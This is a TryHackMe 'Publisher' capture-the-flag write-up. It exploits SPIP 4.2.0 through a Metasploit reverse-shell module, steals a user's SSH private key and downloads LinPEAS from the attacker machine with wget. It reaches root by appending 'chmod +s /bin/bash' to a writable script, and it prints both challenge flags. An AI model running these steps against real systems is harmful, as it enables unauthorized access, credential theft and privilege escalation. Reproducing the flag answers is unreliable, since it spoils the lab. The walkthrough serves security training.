# 📰 TryHackMe — Publisher

> **SPIP 4.2.0 | Unauthenticated RCE | SSH Key Extraction | Linux Enumeration | Docker | SUID Abuse | Privilege Escalation**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-f9a825?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-SPIP%20RCE-e63946?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%20SSH-008cc1?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)

---

## 📋 Overview

**Publisher** is a TryHackMe Linux machine focused on web application enumeration, identifying the **SPIP CMS**, exploiting an unauthenticated remote code execution vulnerability, obtaining an initial shell, and performing Linux privilege escalation through Docker/container functionality.

The machine demonstrates how an externally exposed vulnerable CMS can provide initial access, followed by local enumeration that reveals an insecure container-management mechanism.

---

## 🎯 Objectives

- Enumerate the web application.
- Discover the hidden `/spip/` directory.
- Identify the SPIP version.
- Research and exploit the vulnerable SPIP installation.
- Obtain an initial shell as `think`.
- Retrieve the user flag.
- Investigate SSH configuration and private keys.
- Obtain SSH access using the recovered private key.
- Perform local privilege-escalation enumeration.
- Investigate Docker/container functionality.
- Analyze `/opt/run_container.sh`.
- Identify an insecure writable script.
- Modify the script to create a SUID Bash binary.
- Obtain a privileged shell.
- Retrieve the root flag.

---

# 🖥️ Target Information

| Information | Value |
|---|---|
| Target IP | `10.49.142.78` |
| OS | Ubuntu 20.04.6 LTS |
| Web Server | Apache |
| HTTP | `80/tcp` |
| CMS | SPIP |
| SPIP Version | `4.2.0` |
| Initial User | `think` |
| Privilege Escalation | Docker / writable script / SUID Bash |
| Final Privilege | `root` |

---

# 🔗 Attack Chain

```text
                    ┌───────────────────────┐
                    │    10.49.142.78       │
                    └───────────┬───────────┘
                                │
                                ▼
                       Web Enumeration
                                │
                                ▼
                            /spip/
                                │
                                ▼
                         SPIP 4.2.0
                                │
                                ▼
                    Unauthenticated RCE
                                │
                                ▼
                         Shell as think
                                │
                                ▼
                           user.txt
                                │
                                ▼
                      ~/.ssh/id_rsa
                                │
                                ▼
                       SSH as think
                                │
                                ▼
                       Local Enumeration
                                │
                                ▼
                    Docker / Container Tool
                                │
                                ▼
                     /opt/run_container.sh
                                │
                                ▼
                      Writable Script Abuse
                                │
                                ▼
                       chmod +s /bin/bash
                                │
                                ▼
                         /bin/bash -p
                                │
                                ▼
                             root
                                │
                                ▼
                           root.txt
```

---

# 🌐 1. Initial Web Enumeration

I first accessed the target web server:

```text
http://10.49.142.78
```

The website displayed a **Community Magazine** application.

The page contained articles, tutorials, galleries and other magazine-related content.

![Web Application](screenshots/01-web.png)

The site appeared to be a CMS-backed application, so the next step was directory enumeration.

---

# 🔎 2. Directory Enumeration

I used Gobuster with the SecLists directory wordlist:

```bash
gobuster dir \
-u http://10.49.142.78/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The scan identified interesting directories including:

```text
/images    (301)
/spip      (301)
```

The `/spip/` directory was particularly interesting because **SPIP** is a known content-management system.

![Gobuster Enumeration](screenshots/02-gobuster.png)

I then accessed:

```text
http://10.49.142.78/spip/
```

---

# 📰 3. Identifying SPIP

The discovered `/spip/` path revealed that the target was running **SPIP**.

One of the accessible articles was:

```text
Title : The Power and Peril of Online Publications :
Navigating the Impact on Society
```

![SPIP Application](screenshots/03-spip.png)

At this point, the next objective was to determine the exact SPIP version.

---

# 🔍 4. Version Identification

I inspected the HTTP response using:

```bash
curl http://10.49.142.78/spip/spip.php?article1 -I
```

The response contained:

```text
Server: Apache/2.4.41 (Ubuntu)

Composed-By: SPIP 4.2.0
```

The important information was:

```text
SPIP 4.2.0
```

![SPIP Version](screenshots/04-version.png)

Knowing the exact software version makes vulnerability research much more reliable.

---

# 🧪 5. Searching for a SPIP Exploit

I opened Metasploit and searched for SPIP-related modules:

```text
msfconsole
```

Then:

```text
search spip
```

Several modules were returned, including:

```text
exploit/multi/http/spip_bigup_unauth_rce
exploit/multi/http/spip_porte_plume_previsu_rce
exploit/multi/http/spip_connect_exec
exploit/multi/http/spip_rce_form
```

The relevant module for this machine was:

```text
exploit/multi/http/spip_rce_form
```

The module description identified it as:

```text
SPIP form PHP Injection
```

![Metasploit SPIP Modules](screenshots/05-metasploit-search.png)

---

# 💥 6. Configuring the SPIP RCE Exploit

I selected the module:

```text
use exploit/multi/http/spip_rce_form
```

I checked the available options:

```text
show options
```

The important settings were:

```text
RHOSTS
RPORT
TARGETURI
LHOST
LPORT
```

I configured the target:

```text
set RHOSTS 10.49.142.78
set RPORT 80
set TARGETURI /spip
```

For the reverse connection:

```text
set LHOST 192.168.132.194
set LPORT 4444
```

The final configuration was:

```text
RHOSTS    10.49.142.78
RPORT     80
TARGETURI /spip
LHOST     192.168.132.194
LPORT     4444
```

![Metasploit Configuration](screenshots/06-metasploit-options.png)

---

# 🚀 7. Exploiting SPIP

I launched the exploit:

```text
run
```

Metasploit performed an automatic vulnerability check.

The output confirmed:

```text
SPIP Version detected: 4.2.0

The target appears to be vulnerable.
The detected SPIP version (4.2.0) is vulnerable.
```

Metasploit then obtained an anti-CSRF token and successfully exploited the target.

A Meterpreter session was opened:

```text
Meterpreter session 1 opened
```

![Successful SPIP RCE](screenshots/07-rce.png)

---

# 🐚 8. Obtaining a Shell

Inside Meterpreter, I switched to a normal shell:

```text
shell
```

I checked the current directory:

```bash
pwd
```

The shell initially showed:

```text
/home/think/spip/spip
```

This indicated that the compromised process was running in the context of the user:

```text
think
```

I moved to the user's home directory:

```bash
cd /home
ls
```

The `think` account was present.

---

# 🚩 9. Retrieving the User Flag

I entered the user's home directory:

```bash
cd think
ls
```

The directory contained:

```text
user.txt
```

I retrieved it:

```bash
cat user.txt
```

The screenshot showed the user flag as:

```text
fa229046d44eda6a3598c73ad96f4ca5
```

![User Flag](screenshots/08-user-flag.png)

At this point, initial access had been established and the user-level objective was complete.

---

# 🔐 10. Investigating SSH

While enumerating the user's home directory, I inspected the `.ssh` directory:

```bash
cd ~/.ssh
ls
```

The directory contained:

```text
authorized_keys
id_rsa
id_rsa.pub
```

The presence of:

```text
id_rsa
```

was significant because it is commonly used as an SSH private key.

I inspected the key:

```bash
cat id_rsa
```

The output contained:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

![SSH Private Key](screenshots/09-ssh-private-key.png)

---

# 💻 11. Using the SSH Private Key

I transferred the private key to my Kali machine and restricted its permissions:

```bash
chmod 600 id_rsa
```

I then used it to authenticate to the target:

```bash
ssh -i id_rsa think@10.49.142.78
```

The connection succeeded.

I obtained an SSH shell as:

```text
think@ip-10-49-142-78
```

![SSH Access](screenshots/10-ssh.png)

This provided a more stable SSH session for local enumeration and privilege escalation.

---

# 🔍 12. Local Enumeration

After obtaining SSH access, I began investigating the system for privilege-escalation opportunities.

I checked the available PEASS tools:

```bash
ls /usr/share/peass/
```

The directory contained:

```text
linpeas
winpeas
```

I entered the Linux PEASS directory:

```bash
cd /usr/share/peass/linpeas
ls
```

The Linux version of LinPEAS was available:

```text
linpeas.sh
```

---

# 📡 13. Transferring LinPEAS

I started a temporary HTTP server on Kali:

```bash
python3 -m http.server 2062
```

The server was listening on:

```text
0.0.0.0:2062
```

I then downloaded LinPEAS onto the target.

Because the original location did not allow writing, I used `/dev/shm`:

```bash
cd /dev/shm
wget http://192.168.132.194:2062/linpeas.sh
```

The file was downloaded successfully.

I made it executable:

```bash
chmod +x linpeas.sh
```

and executed it:

```bash
./linpeas.sh
```

![LinPEAS Transfer](screenshots/10-1-linpeas.png)

---

# 🐳 14. Investigating Container Functionality

During enumeration, container-related functionality became interesting.

The system contained:

```text
/usr/sbin/run_container
```

Running the program displayed:

```text
List of Docker containers:

ID: 41c976e507f8 | Name: jovial_hertz | Status: Up
```

It then provided options:

```text
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
```

![Container Management](screenshots/10-2-container.png)

This indicated that the machine had custom container-management functionality.

---

# 📜 15. Analyzing `run_container.sh`

I investigated:

```text
/opt/run_container.sh
```

The script contained Docker commands.

One important section listed running containers:

```bash
docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
```

The script also contained container-management functions such as:

```bash
docker start "$container_id"
docker stop "$container_id"
docker restart "$container_id"
```

and container creation:

```bash
docker run -d --restart always -p 80:80 \
-v /home/think:/home/think \
spip-image:latest
```

![run_container.sh](screenshots/10-2-run-container.png)

The script was therefore responsible for controlling Docker containers.

---

# ⚠️ 16. Identifying the Privilege Escalation Path

The important observation was that the custom container-management mechanism interacted with:

```text
/opt/run_container.sh
```

and the script was writable from the available environment.

The goal was to modify the script so that an executable would receive the SUID permission.

I prepared a command that would execute:

```bash
chmod +s /bin/bash
```

The modified script therefore contained an additional command:

```bash
chmod +s /bin/bash
```

---

# 💣 17. Creating the SUID Bash

The malicious command was appended to the script:

```bash
echo "chmod +s /bin/bash" >> run_container.sh
```

The script was then executed through the container-management functionality.

After the modified script executed, I checked the permissions of Bash:

```bash
ls -la /bin/bash
```

The output showed:

```text
-rwsr-sr-x 1 root root ... /bin/bash
```

The important part was:

```text
rws
```

The `s` indicated that the **SUID bit** had been set.

![SUID Bash](screenshots/11-suid-bash.png)

---

# 👑 18. Exploiting SUID Bash

Normally, when running:

```bash
/bin/bash
```

the shell keeps the current user's privileges.

However, because Bash now had the SUID bit set and was owned by root, I could preserve the elevated effective UID using:

```bash
/bin/bash -p
```

The prompt changed to:

```text
bash-5.0#
```

I now had a privileged shell.

---

# 🔎 19. Confirming Root Access

I verified access by navigating to `/root`:

```bash
cd /root
ls
```

The directory contained:

```text
root.txt
spip
```

This confirmed that the shell had access to the root user's home directory.

![Root Access](screenshots/11-root.png)

---

# 🚩 20. Retrieving the Root Flag

I retrieved the final flag:

```bash
cat root.txt
```

The root flag shown in the screenshot was:

```text
3a4225cc9e85709adae6ef55d6a4f2ca
```

![Root Flag](screenshots/11-root-flag.png)
